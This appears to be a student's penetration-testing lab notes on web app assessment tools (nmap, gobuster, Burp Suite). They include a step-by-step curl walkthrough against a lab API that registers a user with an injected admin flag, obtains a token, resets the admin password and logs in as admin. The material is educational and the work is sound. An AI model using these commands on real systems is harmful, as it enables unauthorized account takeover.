## Assessmnet tools
### finger print with nmap
sudo nmap -p80  -sV 192.168.50.20 -> find services on port 80

**service specific nmap scripts

sudo nmap -p80 --script=http-enum 192.168.50.20
### wappalyzer
https://www.wappalyzer.com/

get technology stack of site
### gobuster
directory brute forcer

gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5

dir - enumerate files and dirs

(also has fuzzing/dns)
### burpsuite (kali)
apps->web app analysis

launch with cmd: burpsuite

### web app enumeration
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

enumerate an API 

curl -i http://192.168.50.16:5002/users/v1

inspect users result from gobuster

gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

further results from the curl where admin name was found

find 2 more paths email and password

curl -i http://192.168.50.16:5002/users/v1/admin/password

appending password to the path (note status code) 405 in example

curl -i http://192.168.50.16:5002/users/v1/login

checking the login path note the message "user not found"

curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

craft a JSON format (-H) request (POST instead of GET)

curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

try to register a user (we see email is required property)

curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register

this successfully registers

curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

log in with curl and a auth token is given from the site

curl 'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
  forge a POST to see if we are successfully an admin user
  curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'

  create a PUT because the last command gave a method not allowed

  no error returned

  curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

  now log in again and get success, so admin account taken over

  **this can be done with burp especially for large APIs

  #### Things to curl
  robots.txt

  sitemap.xml
  
